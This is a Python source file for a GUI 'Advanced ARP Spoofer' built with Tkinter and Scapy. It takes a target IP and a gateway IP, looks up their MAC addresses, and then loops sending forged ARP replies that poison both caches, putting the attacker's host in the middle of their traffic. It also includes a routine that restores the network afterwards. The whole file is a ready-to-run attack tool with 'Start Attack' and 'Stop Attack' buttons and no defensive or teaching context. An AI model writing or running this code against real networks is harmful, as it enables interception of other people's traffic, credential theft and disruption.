import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from scapy.all import ARP, Ether, send, srp
import time
import threading
import uuid
import socket
import ipaddress
import logging
from datetime import datetime

class ARPSpoofer:
    def __init__(self):
        self.setup_logging()
        self.attack_running = False
        self.spoofing_thread = None
        self.attacker_mac = self.get_attacker_mac()
        self.create_gui()
        
    def setup_logging(self):
        logging.basicConfig(
            filename=f'arp_spoofer_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        
    def get_attacker_mac(self):
        return ':'.join(['{:02x}'.format((uuid.getnode() >> (i * 8)) & 0xff) for i in range(6)][::-1])
        
    def validate_ip(self, ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
            
    def get_mac(self, ip):
        try:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            result = srp(arp_request, timeout=3, verbose=False)[0]
            return result[0][1].hwsrc if result else None
        except Exception as e:
            logging.error(f"Error getting MAC for {ip}: {str(e)}")
            return None
            
    def spoof_arp(self, target_ip, gateway_ip):
        try:
            target_mac = self.get_mac(target_ip)
            gateway_mac = self.get_mac(gateway_ip)
            
            if not all([target_mac, gateway_mac]):
                self.log_output("Failed to get MAC addresses. Stopping attack.")
                self.stop_attack()
                return
                
            self.log_output(f"Target MAC: {target_mac}")
            self.log_output(f"Gateway MAC: {gateway_mac}")
            
            while self.attack_running:
                target_packet = ARP(
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=gateway_ip,
                    hwsrc=self.attacker_mac,
                    op=2
                )
                
                gateway_packet = ARP(
                    pdst=gateway_ip,
                    hwdst=gateway_mac,
                    psrc=target_ip,
                    hwsrc=self.attacker_mac,
                    op=2
                )
                
                send(target_packet, verbose=False)
                send(gateway_packet, verbose=False)
                
                self.log_output(f"Packets sent to {target_ip} and {gateway_ip}")
                time.sleep(2)
                
        except Exception as e:
            logging.error(f"Spoofing error: {str(e)}")
            self.log_output(f"Error during attack: {str(e)}")
            self.restore_network(target_ip, gateway_ip)
            
    def restore_network(self, target_ip, gateway_ip):
        try:
            target_mac = self.get_mac(target_ip)
            gateway_mac = self.get_mac(gateway_ip)
            
            if target_mac and gateway_mac:
                for _ in range(5):
                   
                    target_packet = ARP(
                        pdst=target_ip,
                        hwdst=target_mac,
                        psrc=gateway_ip,
                        hwsrc=gateway_mac,
                        op=2
                    )
                    
                   
                    gateway_packet = ARP(
                        pdst=gateway_ip,
                        hwdst=gateway_mac,
                        psrc=target_ip,
                        hwsrc=target_mac,
                        op=2
                    )
                    
                    send(target_packet, verbose=False)
                    send(gateway_packet, verbose=False)
                    time.sleep(0.2)
                    
                self.log_output("Network restored to normal operation")
                logging.info("Network restored successfully")
        except Exception as e:
            logging.error(f"Error restoring network: {str(e)}")
            self.log_output(f"Failed to restore network: {str(e)}")
            
    def start_attack(self):
        
        target_ip = self.target_ip_entry.get().strip()
        gateway_ip = self.gateway_ip_entry.get().strip()
        
        if not all([self.validate_ip(target_ip), self.validate_ip(gateway_ip)]):
            messagebox.showerror("Error", "Please enter valid IP addresses")
            return
            
        if self.attack_running:
            messagebox.showwarning("Warning", "Attack already in progress")
            return
            
        self.attack_running = True
        self.update_gui_state("running")
        self.output_text.delete(1.0, tk.END)
        
        logging.info(f"Starting attack - Target: {target_ip}, Gateway: {gateway_ip}")
        self.spoofing_thread = threading.Thread(
            target=self.spoof_arp,
            args=(target_ip, gateway_ip),
            daemon=True
        )
        self.spoofing_thread.start()
        
    def stop_attack(self):
        
        if not self.attack_running:
            return
            
        self.attack_running = False
        target_ip = self.target_ip_entry.get().strip()
        gateway_ip = self.gateway_ip_entry.get().strip()
        
        if self.spoofing_thread and self.spoofing_thread.is_alive():
            self.restore_network(target_ip, gateway_ip)
            self.spoofing_thread.join(timeout=3)
            
        self.update_gui_state("stopped")
        logging.info("Attack stopped and network restored")
        
    def log_output(self, message):
       
        self.output_text.insert(tk.END, f"{datetime.now().strftime('%H:%M:%S')} - {message}\n")
        self.output_text.see(tk.END)
        
    def update_gui_state(self, state):
        if state == "running":
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.target_ip_entry.config(state=tk.DISABLED)
            self.gateway_ip_entry.config(state=tk.DISABLED)
        else:
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.target_ip_entry.config(state=tk.NORMAL)
            self.gateway_ip_entry.config(state=tk.NORMAL)
            
    def create_gui(self):
        self.root = tk.Tk()
        self.root.title("Advanced ARP Spoofer")
        self.root.geometry("600x500")

        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        ip_frame = ttk.LabelFrame(main_frame, text="Network Configuration", padding="5")
        ip_frame.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=5)
        
        ttk.Label(ip_frame, text="Target IP:").grid(row=0, column=0, padx=5, pady=5)
        self.target_ip_entry = ttk.Entry(ip_frame, width=20)
        self.target_ip_entry.grid(row=0, column=1, padx=5, pady=5)
        
        ttk.Label(ip_frame, text="Gateway IP:").grid(row=0, column=2, padx=5, pady=5)
        self.gateway_ip_entry = ttk.Entry(ip_frame, width=20)
        self.gateway_ip_entry.grid(row=0, column=3, padx=5, pady=5)
        
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=1, column=0, columnspan=2, pady=10)
        
        self.start_button = ttk.Button(
            button_frame,
            text="Start Attack",
            command=self.start_attack
        )
        self.start_button.grid(row=0, column=0, padx=5)
        
        self.stop_button = ttk.Button(
            button_frame,
            text="Stop Attack",
            command=self.stop_attack,
            state=tk.DISABLED
        )
        self.stop_button.grid(row=0, column=1, padx=5)
        
        output_frame = ttk.LabelFrame(main_frame, text="Log Output", padding="5")
        output_frame.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)
        
        self.output_text = scrolledtext.ScrolledText(
            output_frame,
            width=60,
            height=20,
            wrap=tk.WORD
        )
        self.output_text.pack(expand=True, fill=tk.BOTH)
        
        main_frame.columnconfigure(0, weight=1)
        main_frame.rowconfigure(2, weight=1)
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
    def on_closing(self):
        if self.attack_running:
            if messagebox.askokcancel("Quit", "An attack is in progress. Stop it and quit?"):
                self.stop_attack()
                self.root.destroy()
        else:
            self.root.destroy()
            
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = ARPSpoofer()
    app.run()
